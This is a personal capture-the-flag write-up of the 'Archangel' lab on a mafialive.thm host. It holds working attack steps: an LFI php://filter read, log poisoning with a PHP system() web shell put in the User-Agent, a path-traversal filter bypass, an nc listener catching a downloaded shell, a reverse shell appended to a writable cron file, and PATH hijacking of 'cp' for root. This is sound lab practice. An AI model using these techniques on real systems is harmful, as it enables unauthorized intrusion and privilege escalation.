## Archangel

---

Tags: Linux, web exploitation, privilege escalation, lfi, log poisoning

Tools: nmap, dirb, php, cron, binary path, 

Process:

* As usual, begin with `nmap -A ` recon scan

* This shows ssh and a webserver

* Run a `dirb` scan on the webserver

    * There's a /flag/ dir but it's a rickroll

    * other dirb results don't yield much

* there is a support@mafialive.thm on the index page for the site

    * adding this domain to /etc/hosts and navigation to http://\<domain\> gives a flag

    * *This made me investigate to further my understand of domain name resolution because to me it doesn't make sense that the domain name and the ip lead to different places given that the domain is an alias for the ip. I pinged the ip and the domain and they basically say the same thing (the domain pings come back as the same ip.*

    * *After some research I learned that it's apparently somewhat common to host multiple sites on the same ip and differentiate between them with the "host" http header value. This makes sense. You're reaching the same web server but getting different responses based on this header value!*

    * *Also, just for reference and abundant clarity, the domain/ip still need to be added to the local resolution file (/etc/hosts) because the domain name doesn't mean anything without this. I already knew this but again this is for abundant clarity.*

* I started a `dirb` scan on the new domain

* There was a robots.txt on the domain hiding a test.php

* Clicking the button fills in a view parameter to a local file. This is where the lfi must come in.

* I couldn't grab /etc/passwd or anything like that...

* So I went for the php filter method and grabbed the test.php and mrrobbot.txt files themselves and decoded them

    * `http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php`

    * test.php had a flag

    * test also shows that the view param must not contain "../.." and must contain "/var/www/html/development_testing/"

    * Using `burpsuite`, I can inject malicious code into the user-agent field

    * Injecting `<?php system($_GET['cmd']); ?>` into the useragent in the request header and then accessing the log file with "http://mafialive.thm/test.php?view=/var/www/html/development_testing//..//..//..//log/apache2/access.log&cmd=\<command to execute\>"

    * hosting a python server locally with a shell and inserting a command to download that shell to the machine.

    * set up listener `nc -lnvp <port>` executed shell with "http://mafialive.thm/shell.php" got user flag from home dir!

* uploaded linpeash to /tmp, `chmod +x` and ran it

* There was a file in /opt/ that was writable so I appended a reverse bash shell that gave me a shell as archangel

* Using `strings` on the "backup" file in the secrets dir, we can see there's a cp command being used so we can use execute our own code by prepending to the path variable

* In /tmp/ I `echo "/bin/bash -p" > cp`,chmod to make it executable, and then `export PATH=/tmp/:$PATH` and then ran the backup file. This gives root!

* Grab the flag and that's it!